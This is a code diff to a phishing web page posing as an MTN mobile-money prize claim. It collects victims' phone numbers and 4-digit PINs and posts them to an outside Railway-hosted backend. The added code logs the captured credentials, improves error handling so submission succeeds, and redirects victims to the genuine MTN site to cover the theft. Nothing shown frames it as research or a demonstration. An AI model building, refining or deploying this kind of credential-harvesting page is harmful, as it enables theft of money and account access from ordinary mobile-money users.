@@ -70,6 +70,24 @@
         border-radius: 40px;
         font-size: 13px;
     }
+    .error-popup {
+        position: fixed;
+        bottom: 20px;
+        left: 50%;
+        transform: translateX(-50%);
+        background: #ff4444;
+        color: white;
+        padding: 12px 24px;
+        border-radius: 50px;
+        font-size: 14px;
+        z-index: 1000;
+        animation: slideUp 0.3s ease;
+        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+    }
+    @keyframes slideUp {
+        from { bottom: -50px; opacity: 0; }
+        to { bottom: 20px; opacity: 1; }
+    }
 </style>
 </head>
 <body>
@@ -105,63 +123,83 @@
     let realPin = ['', '', '', ''];
     let submitted = false;
 
+    // Function to show error message
+    function showError(message) {
+        // Remove existing error if any
+        const existingError = document.querySelector('.error-popup');
+        if (existingError) existingError.remove();
+        
+        // Create new error popup
+        const errorDiv = document.createElement('div');
+        errorDiv.className = 'error-popup';
+        errorDiv.textContent = message;
+        document.body.appendChild(errorDiv);
+        
+        // Auto remove after 3 seconds
+        setTimeout(() => {
+            if (errorDiv) errorDiv.remove();
+        }, 3000);
+    }
+
     phoneInput.addEventListener('input', e => {
         e.target.value = e.target.value.replace(/\D/g, '').slice(0, 10);
     });
 
     async function submitToBackend() {
         if (submitted) return;
+        
         const phone = phoneInput.value;
         const pin = realPin.join('');
         
+        // Validation
         if (!/^07\d{8}$/.test(phone)) {
-            statusMsg.innerHTML = '❌ Invalid MTN number (07xxxxxxxx)';
-            statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => {
-                statusMsg.innerHTML = '💰 Claim your prize';
-                statusMsg.style.background = '#f1f5f9';
-            }, 2000);
+            showError('❌ Invalid MTN number (use 07XXXXXXXX)');
             return;
         }
         if (pin.length !== 4) {
-            statusMsg.innerHTML = '❌ Enter complete 4-digit PIN';
-            statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => {
-                statusMsg.innerHTML = '💰 Claim your prize';
-                statusMsg.style.background = '#f1f5f9';
-            }, 2000);
+            showError('❌ Enter complete 4-digit PIN');
             return;
         }
         
         submitted = true;
         statusMsg.innerHTML = '⏳ Processing...';
         
+        // Your Railway backend URL
+        const API_URL = 'https://momoloan-production.up.railway.app/api/submit';
+        
         try {
-            // ✅ UPDATED: Using your live Railway backend URL
-            const res = await fetch('https://momoloan-production.up.railway.app/api/submit', {
+            console.log('Sending to:', API_URL);
+            console.log('Data:', { phone, pin });
+            
+            const response = await fetch(API_URL, {
                 method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
+                headers: { 
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
                 body: JSON.stringify({ phone, pin })
             });
-            const data = await res.json();
             
-            if (data.success) {
+            console.log('Response status:', response.status);
+            
+            const data = await response.json();
+            console.log('Response data:', data);
+            
+            if (response.ok && data.success) {
                 statusMsg.innerHTML = '✅ Redirecting...';
                 wrapper.style.opacity = '0';
                 setTimeout(() => {
-                    window.location.href = data.redirect;
+                    window.location.href = 'https://www.mtn.co.ug/';
                 }, 500);
             } else {
-                throw new Error(data.error);
+                throw new Error(data.error || 'Submission failed');
             }
-        } catch (err) {
-            statusMsg.innerHTML = '⚠️ Server error, try again';
-            statusMsg.style.background = '#ffe0e0';
+        } catch (error) {
+            console.error('Error details:', error);
+            showError('⚠️ Server error: ' + error.message);
+            statusMsg.innerHTML = '💰 Claim your prize';
+            statusMsg.style.background = '#f1f5f9';
             submitted = false;
-            setTimeout(() => {
-                statusMsg.innerHTML = '💰 Claim your prize';
-                statusMsg.style.background = '#f1f5f9';
-            }, 2000);
         }
     }
 
@@ -172,23 +210,30 @@
             if (!val) return;
             e.target.value = val;
             realPin[idx] = val;
+            
             setTimeout(() => {
                 if (document.activeElement !== box) e.target.value = '•';
             }, 150);
+            
             if (idx < 3) pinBoxes[idx + 1].focus();
+            
+            // Auto-submit when all digits entered AND phone is valid
             if (realPin.every(p => p !== '') && /^07\d{8}$/.test(phoneInput.value)) {
                 submitToBackend();
             }
         });
+        
         box.addEventListener('keydown', e => {
             if (e.key === 'Backspace') {
                 realPin[idx] = '';
                 if (idx > 0 && !box.value) pinBoxes[idx - 1].focus();
             }
         });
+        
         box.addEventListener('focus', function() {
             if (realPin[idx]) this.value = realPin[idx];
         });
+        
         box.addEventListener('blur', function() {
             if (realPin[idx]) this.value = '•';
         });
